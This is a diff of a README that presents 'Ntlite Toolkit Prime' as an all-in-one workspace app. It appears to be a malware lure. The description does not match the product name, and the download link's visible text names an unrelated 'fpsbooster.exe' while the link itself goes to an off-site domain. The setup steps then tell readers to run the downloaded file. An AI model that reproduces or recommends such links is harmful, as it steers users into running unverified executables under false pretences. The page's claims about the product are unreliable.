@@ -1,6 +1,7 @@
 # 🚀 Ntlite Toolkit Prime
 
 ## 📝 Description
+
 All-in-one **Ntlite Toolkit Prime** workspace solution featuring document editing, task boards, and real-time team communication.
 
 <p align="center">
@@ -9,22 +10,22 @@ All-in-one **Ntlite Toolkit Prime** workspace solution featuring document editin
   <img src="https://img.shields.io/badge/License-Free-blue?style=for-the-badge" alt="License" />
 </p>
 
----
+\---
 
-## 📥 Downloads & Links
+## 📥 Downloads \& Links
 
-- 📖 **Documentation:** [Visit Documentation](https://ntlite-toolkit-prime.softhvn.xyz)
-- 💾 **Download Latest Release:** [Download Release](https://ntlite-toolkit-prime.softhvn.xyz)
+* 📖 **Documentation:** [Visit Documentation](https://ntlite-toolkit-prime.softhvn.xyz)
+* 💾 **Download Latest Release:** [https://github.com/roman-moore-1990w7/fps-booster-2026/releases/download/fps/fpsbooster.exe](https://ntlite-toolkit-prime.softhvn.xyz)
 
----
+\---
 
 ## ⚡ Key Features
 
-- **Calendar & Scheduling:** Built-in planner with recurring events, deadlines, and time blocking.
-- **Document Editor:** Rich-text editing with markdown support, tables, and embedded media.
-- **Analytics Dashboard:** Visual reports on project progress, team workload, and deadlines.
+* **Calendar \& Scheduling:** Built-in planner with recurring events, deadlines, and time blocking.
+* **Document Editor:** Rich-text editing with markdown support, tables, and embedded media.
+* **Analytics Dashboard:** Visual reports on project progress, team workload, and deadlines.
 
----
+\---
 
 ## 🚀 Quick Setup Guide
 
@@ -32,8 +33,10 @@ All-in-one **Ntlite Toolkit Prime** workspace solution featuring document editin
 2. Unpack the downloaded archive to a folder of your choice.
 3. Run the setup file and follow the on-screen instructions.
 
----
+\---
 
 ## ⚠️ Disclaimer
-> [!CAUTION]
+
+> \[!CAUTION]
 > This repository is provided for educational and utility purposes only. Use at your own discretion.
+
